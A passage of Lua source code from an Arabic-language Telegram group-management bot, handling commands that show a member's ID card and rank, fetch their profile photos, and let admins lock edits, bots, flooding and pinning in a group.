if result.username_ then username = '@'..result.username_ else username = ' لا يوجد 🎍 ' end
local function getpro(extra, result, success) 
local DevProx = DevAbs:get(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local DevProxy = (DevAbs:get('DevProx:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(DevAbs:get(DevProx.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local user_nkt = tonumber(DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevAbs:get(DevProx..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
if result.photos_[0] then
if is_sudo(msg) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_admin(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not DevAbs:get('DevProx:id:mute'..msg.chat_id_) then 
if not DevAbs:get('DevProx:id:photo'..msg.chat_id_) then 
if not DevAbs:get("DevProx:DevProx:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"\n🏮✥ يوزرك ⌯» { "..username.." }\n🌌✥ صورك ⌯» {"..result.total_count_.."}\n💳✥ ايديك ⌯» {"..msg.sender_user_id_.."}\n👨🏻‍✈️✥ رتبتك ⌯» {"..t.."}\n📑✥ رسائلك ⌯» {"..(user_msgs + DevProxy).." / "..(DevProx).."}\n📖✥ تفاعلك ⌯»{"..formsgg(msguser).."}\n💎✥ نقاطك ⌯» {"..user_nkt.."}\n🦠✥ جهاتك ⌯» {"..cont.."}\n➖➖➖➖➖➖➖➖ ➖➖➖➖\n",msg.id_,msg.id_.."")
else 
local new_id = DevAbs:get("DevProx:DevProx:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('username',(username or 'لا يوجد'))
local new_id = new_id:gsub('photo',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('nkat',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('msgs',(user_msgs + DevProxy / DevProx or 'لا يوجد'))
local new_id = new_id:gsub('id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('renk',(t or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if is_sudo(msg) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_admin(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not DevAbs:get("DevProx:DevProx:id:text:"..bot_id..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏮✥ يوزرك ⌯» { "..username.." }\n🌌✥ صورك ⌯» {"..result.total_count_.."}\n💳✥ ايديك ⌯» {"..msg.sender_user_id_.."}\n👨🏻‍✈️✥ رتبتك ⌯» {"..t.."}\n📑✥ رسائلك ⌯» {"..(user_msgs + DevProxy).." / "..(DevProx).."}\n📖✥ تفاعلك ⌯»{"..formsgg(msguser).."}\n💎✥ نقاطك ⌯» {"..user_nkt.."}\n🦠✥ جهاتك ⌯» {"..cont.."}\n➖➖➖➖➖➖➖➖ ➖➖➖➖\n", 1, 'html')
else
local new_id = DevAbs:get("DevProx:DevProx:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('username',(username or 'لا يوجد'))
local new_id = new_id:gsub('photo',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('nkat',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('msgs',(user_msgs + DevProxy / DevProx or 'لا يوجد'))
local new_id = new_id:gsub('id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('renk',(t or 'لا يوجد'))
Dev_Abs(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ID disabled  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ الايدي معطل  ', 1, 'md')
end
end
else
if is_sudo(msg) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_admin(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not DevAbs:get('DevProx:id:mute'..msg.chat_id_) then
if not DevAbs:get('DevProx:id:photo'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "◗≡¹┇ You not have any photo \n◗≡²┇ User name ‹› "..username.."\n◗≡³┇ Point ‹› "..user_nkt.."\n◗≡⁴┇ Contacts ‹› "..cont.."\n◗≡°┇ Sticker ‹› "..sticker.."\n◗≡⁴┇ Msg ‹› "..user_msgs.."\n◗≡³┇ ID ‹› "..msg.sender_user_id_.."\n◗≡²┇ interaction ‹› "..formsgg(msguser).."\n◗≡¹┇ Renk ‹› "..t.."\n", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❌✥ لا استطيع عرض صورتك الاسباب المحتمله ⌯\n💢✥ انك دخلت للبوت ثم حظرته ⌯\n💢✥ انك لا تمتلك صوره شخصيه ⌯\n💢✥ انك قمت بقفلها من اعدادات تليكرام ⌯\n\n🏮✥ يوزرك ⌯» { "..username.." }\n🌌✥ صورك ⌯» {"..result.total_count_.."}\n💳✥ ايديك ⌯» {"..msg.sender_user_id_.."}\n👨🏻‍✈️✥ رتبتك ⌯» {"..t.."}\n📑✥ رسائلك ⌯» {"..(user_msgs + DevProxy).." / "..(DevProx).."}\n📖✥ تفاعلك ⌯»{"..formsgg(msguser).."}\n💎✥ نقاطك ⌯» {"..user_nkt.."}\n🦠✥ جهاتك ⌯» {"..cont.."}\n➖➖➖➖➖➖➖➖ ➖➖➖➖\n", 1, 'html')
end
else
if is_sudo(msg) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_admin(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "◗≡¹┇ User name ‹› "..username.."\n◗≡²┇ Photo ‹› "..result.total_count_.."\n◗≡³┇ Point ‹› "..user_nkt.."\n◗≡⁴┇ Contacts ‹› "..cont.."\n◗≡°┇ Sticker ‹› "..sticker.."\n◗≡⁴┇ Msg ‹› "..user_msgs.."\n◗≡³┇ ID ‹› "..msg.sender_user_id_.."\n◗≡²┇ interaction ‹› "..formsgg(msguser).."\n◗≡¹┇ Renk ‹› "..t.."\n", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏮✥ يوزرك ⌯» { "..username.." }\n🌌✥ صورك ⌯» {"..result.total_count_.."}\n💳✥ ايديك ⌯» {"..msg.sender_user_id_.."}\n👨🏻‍✈️✥ رتبتك ⌯» {"..t.."}\n📑✥ رسائلك ⌯» {"..(user_msgs + DevProxy).." / "..(DevProx).."}\n📖✥ تفاعلك ⌯»{"..formsgg(msguser).."}\n💎✥ نقاطك ⌯» {"..user_nkt.."}\n🦠✥ جهاتك ⌯» {"..cont.."}\n➖➖➖➖➖➖➖➖ ➖➖➖➖\n", 1, 'html')
end
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ID disabled  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ الايدي معطل  ', 1, 'md')
end end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1
}, getpro, nil)
end
getUser(msg.sender_user_id_, DevProx)
end
end 
------------------------------------------DevProx----------------------------------------------------
if text == "صورتي" and not DevAbs:get(DevProx.."lock:get:photo"..msg.chat_id_)  then 
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"📤┇ لديك "..result.total_count_.." صوره‌‏ ", msg.id_, msg.id_, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ لا تمتلك صوره في حسابك  ", 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end 
if text:match("^صورتي (%d+)$") then
local pronumb = {string.match(text, "^(صورتي) (%d+)$")}
local function gproen(extra, result, success)
if not is_momod(msg.sender_user_id_, msg.chat_id_) and DevAbs:get(DevProx.."lock:get:photo"..msg.chat_id_)  then 
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ Get profile photo is deactive ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '️🚏 ┇ جلب الصوره الشخصيه معطل  ✅', 1, 'md')
end
else
if pronumb[2] == '1' then
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك صوره شخصيه ", 1, 'md')
end
end
elseif pronumb[2] == '2' then
if result.photos_[1] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have 2 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '3' then
if result.photos_[2] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have 3 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏆┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '4' then
if result.photos_[3] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have 4 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '5' then
if result.photos_[4] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't 5 have profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '6' then
if result.photos_[5] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have 6 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '7' then
if result.photos_[6] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have 7 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '8' then
if result.photos_[7] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have 8 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '9' then
if result.photos_[8] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have 9 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '10' then
if result.photos_[9] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ You don't have 10 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇ I just can get last 10 profile photos ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🚏 ┇لا يمكنني ان ارسل لك اكثر من 10 صور ", 1, 'md')
end
end
end
end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = pronumb[2]
}, gproen, nil)
end
----------------------------------DevProx-------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
local lockpt = {string.match(text, "^([Ll]ock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockpt[2] == "edit" or lockptf[2] == "التعديل" then
if not DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  التعديل  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 60, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'editmsg'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل التعديل سابقا ✔️', 1, 'md')
end
end
if lockpt[2] == "cmd" or lockptf[2] == "الشارحه" then
if not DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ Has been lock cmd ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الشارحه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:cmds'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ cmd is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الشارحه سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "bots" or lockptf[2] == "البوتات" then
if not DevAbs:get(DevProx..'bot:bots:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock bots ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  البوتات  \n⏱┇ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:bots:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ bots is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل البوتات سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "bots ban" or lockptf[2] == "البوتات بالطرد" then
if not DevAbs:get(DevProx..'bot:bots:ban'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock bots ban ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  البوتات بالطرد  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 65, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:bots:ban'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ bots is already locked ban ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل البوتات بالطرد سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "bots keed" or lockptf[2] == "البوتات بالتقييد" then
if not DevAbs:get(DevProx..'keed_bots'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock bots keed ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  البوتات بالتقييد  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 67, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'keed_bots'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ bots is already locked keed ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل البوتات بالتقييد سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "flood" or lockptf[2] == "التكرار" then
if not DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock flood ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  التكرار  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'anti-flood:'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ flood is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل التكرار سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "pin" or lockptf[2] == "التثبيت" then
if not DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock pin ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  التثبيت  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:pin:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ pin is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل التثبيت سابقا ✔️', 1, 'md')
end
end
end
end
end
-----------------------------------DevProx------------------------------------------------------------
local text = msg.content_.text_:gsub('ضع تكرار','Setflood')
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etflood (%d+)$") then
local floodmax = {string.match(text, "^([Ss]etflood) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Select a number greater than 2 ', 1, 'md')
else
